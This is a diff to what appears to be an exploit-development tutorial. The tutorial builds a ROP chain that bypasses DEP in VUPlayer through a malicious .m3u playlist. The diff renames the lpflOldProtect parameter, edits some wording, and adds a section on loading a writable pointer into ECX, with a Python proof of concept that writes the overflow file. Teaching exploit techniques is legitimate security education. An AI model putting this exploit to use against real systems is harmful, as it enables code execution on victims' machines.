@@ -133,7 +133,7 @@ Considering all of these facts, our goals can be summarized as thus following fr
 ```
 GOALS
 EAX 90909090 => Nop                                              
-ECX <writeable pointer> => flProtect                                
+ECX <writeable pointer> => lpflOldProtect                                
 EDX 00000040 => flNewProtect                                   
 EBX 00000201 => dwSize                                           
 ESP ???????? => Leave as is                                 
@@ -156,7 +156,7 @@ crash_file = "vuplayer-dep.m3u"
 
 # GOALS
 # EAX 90909090 => Nop                                                
-# ECX <writeable pointer> => flProtect                                 
+# ECX <writeable pointer> => lpflOldProtect                                 
 # EDX 00000040 => flNewProtect                             
 # EBX 00000201 => dwSize                                            
 # ESP ???????? => Leave as is                                         
@@ -208,7 +208,7 @@ crash_file = "vuplayer-dep.m3u"
 
 # GOALS
 # EAX 90909090 => Nop                                                
-# ECX <writeable pointer> => flProtect                                 
+# ECX <writeable pointer> => lpflOldProtect                                 
 # EDX 00000040 => flNewProtect                             
 # EBX 00000201 => dwSize                                            
 # ESP ???????? => Leave as is                                         
@@ -239,7 +239,7 @@ crash_file = "vuplayer-dep.m3u"
 
 # GOALS
 # EAX 90909090 => Nop                                                
-# ECX <writeable pointer> => flProtect                                 
+# ECX <writeable pointer> => lpflOldProtect                                 
 # EDX 00000040 => flNewProtect                             
 # EBX 00000201 => dwSize                                            
 # ESP ???????? => Leave as is                                         
@@ -263,6 +263,56 @@ makedafile.write(fuzz)
 makedafile.close()
 ```
 
-We run it, using our aforementioned test method and stepping through it and indeed EAX now holds `90909090`. 
+We run it, using our aforementioned test method and stepping through it, and we see that EAX now holds `90909090`. 
 
 ![](/assets/images/AWE/eaxtest.JPG)
+
+**I won't be testing each gadget going forward, it's incumbent upon the reader to develop troubleshooting skills on their own.**
+
+We can now add `{COMPLETED}` to our goals in our exploit POC so we can keep track of our progress. Onto the next goal!
+
+## ECX ROP Chain
+Looking at our goals, we need ECX to just hold a pointer to a writable location. Please read more on `lpflOldProtect` and why the parameter is this way. Is it an input parameter or an output parameter? 
+
+This is very similar to our last gadget. Let's put the value we need onto the stack and then `POP` it into ECX. I looked at the 3 modules we're using in Immunity and arbitrarily picked a location within `BASSWMA.dll` which was marked `RWX` so I know we have write privileges to it (`0x101053dc`).
+
+Next, consult `rop_suggestions.txt` for a good `pop ecx` instruction. 
+
+In the end, we can update our POC with our new gadget as follows: 
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop                                                
+# ECX <writeable pointer> => lpflOldProtect                                 
+# EDX 00000040 => flNewProtect                             
+# EBX 00000201 => dwSize                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..)                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+# ECX Chunk Affects: ECX
+ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
+ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer
+
+rop = ""
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
+
